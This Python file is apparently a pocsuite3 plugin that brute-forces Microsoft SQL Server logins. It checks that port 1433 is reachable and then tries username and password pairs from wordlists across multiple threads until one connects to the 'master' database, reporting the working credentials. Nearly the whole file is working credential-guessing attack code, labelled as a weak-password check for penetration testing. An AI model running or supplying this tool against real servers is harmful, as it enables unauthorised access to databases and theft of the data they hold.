#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File : mssql_burst.py
# @Author : Norah C.IV
# @Time : 2022/4/24 18:01
# @Software: PyCharm
import itertools
import queue
import socket
import pymssql


from collections import OrderedDict
from pocsuite3.api import POCBase, Output, register_poc, POC_CATEGORY, VUL_TYPE, logger
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.core.interpreter_option import OptInteger
from pocsuite3.lib.core.threads import run_threads


class DemoPOC(POCBase):
    vulID = '2'
    version = '1'
    author = ['Norah C.IV']
    vulDate = '2022-04-24'
    createDate = '2022-04-24'
    updateDate = '2022-04-24'
    references = ['']
    name = 'MSSQL 弱密码'
    appPowerLink = ''
    appName = 'MSSQL'
    appVersion = 'All'
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''mssql 存在弱密码，攻击者可连接主机进行操作，导致数据泄露'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.MSSQL

    def _options(self):
        o = OrderedDict()
        o["mssql_burst_threads"] = OptInteger(1, description='set mssql_burst_threads', require=False)
        return o

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 1433
        mssql_burst_threads = self.get_option("mssql_burst_threads")

        task_queue = queue.Queue()
        result_queue = queue.Queue()
        mssql_burst(host, port, task_queue, result_queue, mssql_burst_threads)

        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


def get_word_list():
    with open(paths.SQL_SERVER_USER) as username:
        with open(paths.SQL_SERVER_PASS) as password:
            return itertools.product(username, password)


def port_check(host, port=1433):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, int(port)))
    if connect == 0:
        print(1)
        return True
    else:
        s.close()
        return False


def mssql_login(host, port, username, password):
    ret = False
    try:
        conn = pymssql.connect(host=host, user=username, passwd=password, port=int(port), database='master',
                               charset='utf-8', timeout=5)
        if conn:
            ret = True
    except Exception:
        pass
    return ret


def task_init(host, port, task_queue, result_queue):
    for username, password in get_word_list():
        task_queue.put((host, port, username.strip(), password.strip()))


def task_thread(task_queue, result_queue):
    while not task_queue.empty():
        host, port, username, password = task_queue.get()
        # logger.info('try burst {}:{} use username:{} password:{}'.format(
        #     host, port, username, password))
        if mssql_login(host, port, username, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))


def mssql_burst(host, port, task_queue, result_queue, mysql_burst_threads):
    if not port_check(host, port):
        logger.warning("{}:{} is unreachable".format(host, port))
        return
    try:
        task_init(host, port, task_queue, result_queue)
        run_threads(mysql_burst_threads, task_thread, args=(task_queue, result_queue))
    except Exception:
        pass


register_poc(DemoPOC)
